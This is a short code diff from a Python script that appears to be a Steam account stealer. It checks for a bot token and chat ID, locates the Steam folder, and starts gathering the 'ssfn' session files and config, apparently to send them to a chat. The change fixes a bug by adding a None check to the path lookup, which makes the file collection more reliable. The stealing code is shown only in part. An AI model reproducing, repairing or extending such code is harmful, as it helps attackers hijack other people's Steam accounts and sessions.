@@ -17,7 +17,7 @@ if token and chatid != "":
         steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
     else:
         steam_path  = steam_search()
-    if steam_path != "":
+    if steam_path != "" and steam_path != None:
         ssfn = []
         config = ""
         for file in os.listdir(steam_path):
